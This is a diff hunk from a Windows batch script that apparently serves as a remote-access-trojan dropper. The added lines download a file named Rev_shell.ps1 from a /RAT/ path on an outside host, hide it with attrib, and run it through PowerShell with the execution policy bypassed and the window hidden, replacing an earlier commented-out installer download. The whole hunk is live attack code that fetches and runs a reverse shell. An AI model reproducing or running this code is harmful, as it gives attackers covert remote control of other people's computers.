@@ -57,9 +57,9 @@ attrib +h "payload.vbs"
 :: -------------------------------------------------------------------------------------------------------------------------------------
 :: -----------------------------------------------------------ps1--------------------------------------------------------------------------
 
-::powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/RAT/installer.ps1' -OutFile installer.ps1"
-::attrib +h "installer.ps1"
-::powershell -windowstyle hidden -ExecutionPolicy Bypass -File "%~dp0\installer.ps1"
+powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/RAT/Rev_shell.ps1' -OutFile Rev_shell.ps1"
+attrib +h "Rev_shell.ps1"
+powershell -ExecutionPolicy Bypass -WindowStyle hidden -File "C:\Users\Arth\AppData\Local\Temp\%MainDirName%\Rev_shell.ps1"
 
 :: -------------------------------------------------------------------------------------------------------------------------------------
 
